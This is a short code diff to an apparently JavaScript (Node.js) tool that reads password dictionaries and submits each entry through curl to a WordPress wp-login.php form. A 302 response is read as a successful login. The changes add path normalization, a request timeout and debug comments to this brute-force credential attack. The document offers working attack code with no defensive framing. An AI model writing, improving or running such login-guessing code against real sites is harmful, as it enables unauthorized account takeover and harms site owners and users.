@@ -190,6 +190,7 @@ function checkDicts(files,cb){
 	,matches = []
 	;
 	files.forEach(function(file,fileIndex){
+		file = path.normalize(file);
 		streams[fileIndex] = fs.createReadStream(file).pipe(split()).on('data',function(pass){
 			if (pass == '')
 				return z.emit('attemptReceived',false);
@@ -270,10 +271,13 @@ function checkAuth(entry,cb){
 	,'-H',"Connection: keep-alive"
 	,'--data',"log="+entry.user+"&pwd="+encodeURIComponent(entry.pass)+"&wp-submit=Log+In&redirect_to="+encodeURIComponent(host+loginPath.replace(/(wp-login\.php)|(wp-login\/?)/,'wp-admin/'))+"&testcookie=1"
 	,'--compressed'
+	,'--max-time','20'
 	];
 	//console.log('curl "'+args.join('" "')+'"');
+	//console.log('----SENDING');
 	ut.spawn(cmd,args,function(err,stdOut,stdErr){
 		//console.log('stdErr:\n'+stdErr+'\nstdOut:\n'+stdOut+'\n\n\n\n');
+		//console.log('----RECEIVED');
 		var successCheck = stdErr.indexOf('302 Found') != -1
 		,invalidPassCheck = stdErr.indexOf('200 OK') != -1
 		;
